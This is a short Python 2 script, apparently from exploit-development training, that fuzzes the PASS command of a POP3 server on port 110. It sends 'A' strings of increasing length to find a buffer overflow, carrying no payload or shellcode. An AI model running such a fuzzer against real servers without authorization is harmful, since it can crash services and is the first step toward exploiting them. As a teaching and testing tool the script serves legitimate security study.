#!/usr/bin/python
import socket
import getopt
import sys
# Create an array of buffers, from 1 to 5900, with increments of 200.
def main(argv):
    ipaddr=''
    try:
        opts, args = getopt.getopt(argv,"hi:",["ip="])
    except getopt.GetoptError:
        print 'pop3-pass-fuzz.py -i <ip>'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'pop3-pass-fuzz.py -i <ip>'
            sys.exit()
        elif opt in ("-i", "--ip"):
            ipaddr = arg
    print 'ipaddr is %s' %ipaddr
    buffer=["A"]
    counter=100
    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+200
    for string in buffer:
        print "Fuzzing PASS with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((ipaddr, 110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()

if __name__ == "__main__":
   main(sys.argv[1:])
